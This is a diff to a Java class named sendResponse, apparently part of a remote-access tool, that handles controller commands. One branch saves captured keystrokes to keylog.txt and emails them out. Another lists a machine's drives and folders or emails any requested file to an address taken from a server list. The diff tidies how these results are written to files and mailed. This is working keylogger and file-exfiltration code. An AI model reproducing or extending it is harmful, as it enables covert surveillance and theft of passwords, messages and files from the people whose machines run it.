@@ -62,12 +62,6 @@ public class sendResponse extends Thread{
                     String text = kl.end();
                     counts[2]++;
                     sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 2 "+counts[2]);
-                    File file = new File("keylog.txt");
-                    try {
-                        file.createNewFile();
-                    } catch (IOException e) {
-                        throw new RuntimeException(e);
-                    }
                     FileWriter fw;
                     try {
                         fw = new FileWriter("keylog.txt");
@@ -79,6 +73,12 @@ public class sendResponse extends Thread{
                     } catch (IOException e) {
                         throw new RuntimeException(e);
                     }
+                    try {
+                        fw.close();
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                    File file = new File("keylog.txt");
                     sm.send(file);
                     System.out.println(2);
                     break;
@@ -143,34 +143,51 @@ public class sendResponse extends Thread{
                 }
                 //getfile
                 case "9 ": {
+                    String text = "Something wrong happened";
                     counts[9]++;
                     GetFile gf = new GetFile();
 
                     if (Server.reqList.get(index).length()<=2){
 
-                        String text = gf.listDrive();
-                        sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
-                        sm.sendContent(text);
+                        text = gf.listDrive();
+
                     }
                     else {
                         String path = Server.reqList.get(index).substring(2);
                         File file = new File(path);
                         if (file.isDirectory()){
-                            String text = gf.listFile(file.getAbsolutePath());
-                            sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
-                            sm.sendContent(text);
+                            text = gf.listFile(file.getAbsolutePath());
                         }
                         else {
                             if (file.exists()){
                                 sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
                                 sm.send(file);
+                                break;
                             }
                             else{
-                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
-                                sm.sendContent("File do not exist");
+                                text = "File do not exist";
                             }
                         }
                     }
+                    File file = new File("filelists.txt");
+                    FileWriter fw;
+                    try {
+                        fw = new FileWriter("filelists.txt");
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                    try {
+                        fw.write(text);
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                    try {
+                        fw.close();
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
+                    sm.send(file);
                     break;
                 }
                 default: {
